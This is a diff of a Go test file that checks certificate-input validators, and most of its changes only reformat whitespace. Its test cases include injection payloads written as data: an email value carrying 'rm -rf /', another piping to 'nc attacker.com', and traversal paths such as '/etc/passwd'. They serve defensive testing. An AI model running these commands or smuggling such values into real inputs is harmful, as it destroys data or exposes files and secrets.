@@ -64,7 +64,7 @@ func TestInputValidationSecurity(t *testing.T) {
 				attack: "quote injection",
 			},
 		}
-		
+
 		for _, tt := range dangerousInputs {
 			t.Run(tt.name, func(t *testing.T) {
 				err := ValidateDomainName(tt.domain)
@@ -73,40 +73,40 @@ func TestInputValidationSecurity(t *testing.T) {
 			})
 		}
 	})
-	
+
 	t.Run("email_validation_security", func(t *testing.T) {
 		dangerousEmails := []struct {
-			name  string
-			email string
+			name   string
+			email  string
 			attack string
 		}{
 			{
-				name:  "command_injection_email",
-				email: "user@domain.com; rm -rf /",
+				name:   "command_injection_email",
+				email:  "user@domain.com; rm -rf /",
 				attack: "command injection",
 			},
 			{
-				name:  "quote_injection_email",
-				email: "user@domain.com\"malicious",
+				name:   "quote_injection_email",
+				email:  "user@domain.com\"malicious",
 				attack: "quote injection",
 			},
 			{
-				name:  "null_byte_email",
-				email: "user@domain.com\x00",
+				name:   "null_byte_email",
+				email:  "user@domain.com\x00",
 				attack: "null byte injection",
 			},
 			{
-				name:  "newline_email",
-				email: "user@domain.com\nmalicious",
+				name:   "newline_email",
+				email:  "user@domain.com\nmalicious",
 				attack: "newline injection",
 			},
 			{
-				name:  "pipe_injection_email",
-				email: "user@domain.com | nc attacker.com",
+				name:   "pipe_injection_email",
+				email:  "user@domain.com | nc attacker.com",
 				attack: "pipe injection",
 			},
 		}
-		
+
 		for _, tt := range dangerousEmails {
 			t.Run(tt.name, func(t *testing.T) {
 				err := ValidateEmailAddress(tt.email)
@@ -115,7 +115,7 @@ func TestInputValidationSecurity(t *testing.T) {
 			})
 		}
 	})
-	
+
 	t.Run("app_name_validation_security", func(t *testing.T) {
 		dangerousAppNames := []struct {
 			name    string
@@ -148,7 +148,7 @@ func TestInputValidationSecurity(t *testing.T) {
 				attack:  "space injection",
 			},
 		}
-		
+
 		for _, tt := range dangerousAppNames {
 			t.Run(tt.name, func(t *testing.T) {
 				err := ValidateAppName(tt.appName)
@@ -168,7 +168,7 @@ func TestValidInputsAccepted(t *testing.T) {
 			"test123.example.org",
 			"a.b",
 		}
-		
+
 		for _, domain := range validDomains {
 			t.Run("domain_"+domain, func(t *testing.T) {
 				err := ValidateDomainName(domain)
@@ -176,15 +176,15 @@ func TestValidInputsAccepted(t *testing.T) {
 			})
 		}
 	})
-	
+
 	t.Run("valid_emails", func(t *testing.T) {
 		validEmails := []string{
 			"user@example.com",
-			"test.user@domain.co.uk", 
+			"test.user@domain.co.uk",
 			"admin+test@example.org",
 			"user123@sub.domain.com",
 		}
-		
+
 		for _, email := range validEmails {
 			t.Run("email_"+email, func(t *testing.T) {
 				err := ValidateEmailAddress(email)
@@ -192,7 +192,7 @@ func TestValidInputsAccepted(t *testing.T) {
 			})
 		}
 	})
-	
+
 	t.Run("valid_app_names", func(t *testing.T) {
 		validAppNames := []string{
 			"myapp",
@@ -201,7 +201,7 @@ func TestValidInputsAccepted(t *testing.T) {
 			"test-application",
 			"web",
 		}
-		
+
 		for _, appName := range validAppNames {
 			t.Run("app_"+appName, func(t *testing.T) {
 				err := ValidateAppName(appName)
@@ -216,14 +216,14 @@ func TestCertificateInputValidationIntegration(t *testing.T) {
 		err := ValidateAllCertificateInputs("myapp", "example.com", "admin@example.com")
 		testutil.AssertNoError(t, err)
 	})
-	
+
 	t.Run("malicious_certificate_inputs", func(t *testing.T) {
 		maliciousTests := []struct {
-			name      string
-			appName   string
-			domain    string
-			email     string
-			attack    string
+			name    string
+			appName string
+			domain  string
+			email   string
+			attack  string
 		}{
 			{
 				name:    "injection_in_app_name",
@@ -254,7 +254,7 @@ func TestCertificateInputValidationIntegration(t *testing.T) {
 				attack:  "constructed FQDN length overflow",
 			},
 		}
-		
+
 		for _, tt := range maliciousTests {
 			t.Run(tt.name, func(t *testing.T) {
 				err := ValidateAllCertificateInputs(tt.appName, tt.domain, tt.email)
@@ -298,7 +298,7 @@ func TestSanitizationSecurity(t *testing.T) {
 				expected: "userdomain.com", // @ gets removed but that's ok for sanitization
 			},
 		}
-		
+
 		for _, tt := range dangerousInputs {
 			t.Run(tt.name, func(t *testing.T) {
 				result := SanitizeInputForCommand(tt.input)
@@ -317,7 +317,7 @@ func TestFilePathValidationSecurity(t *testing.T) {
 			"/etc/passwd",
 			"certs/../../sensitive",
 		}
-		
+
 		for _, path := range dangerousPaths {
 			t.Run("dangerous_path_"+path, func(t *testing.T) {
 				err := validateFilePath(path)
@@ -326,14 +326,14 @@ func TestFilePathValidationSecurity(t *testing.T) {
 			})
 		}
 	})
-	
+
 	t.Run("valid_paths_accepted", func(t *testing.T) {
 		validPaths := []string{
 			"certs/example.com.pem",
 			"certs/my-app.example.com.privkey.pem",
 			"certificates/test.fullchain.pem",
 		}
-		
+
 		for _, path := range validPaths {
 			t.Run("valid_path_"+path, func(t *testing.T) {
 				err := validateFilePath(path)
@@ -351,13 +351,13 @@ func TestEnsureCertificatesSecurity(t *testing.T) {
 		testutil.AssertError(t, err)
 		testutil.AssertErrorContains(t, err, "validation failed")
 	})
-	
+
 	t.Run("reject_invalid_domain", func(t *testing.T) {
 		err := EnsureCertificates("myapp", "invalid..domain", "admin@example.com")
 		testutil.AssertError(t, err)
 		testutil.AssertErrorContains(t, err, "validation failed")
 	})
-	
+
 	t.Run("reject_invalid_email", func(t *testing.T) {
 		err := EnsureCertificates("myapp", "example.com", "invalid-email")
 		testutil.AssertError(t, err)
